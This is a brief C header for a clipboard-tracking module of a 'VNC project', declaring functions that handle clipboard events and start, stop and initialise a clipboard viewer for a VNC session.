//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: clipbd.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	host clipboard tracker

#ifndef __CLIPBD_H_
#define __CLIPBD_H_

VOID ClipOnEvent(PVNC_SESSION pVncSession, PCHAR Text, int Length );
WINERROR
	ClipStartViewer(
		PVNC_SESSION pSession
		);

VOID
	ClipStopViewer(
		PVNC_SESSION pSession
		);

WINERROR
	ClipInitialize(
		VOID
		);

#endif //__CLIPBD_H_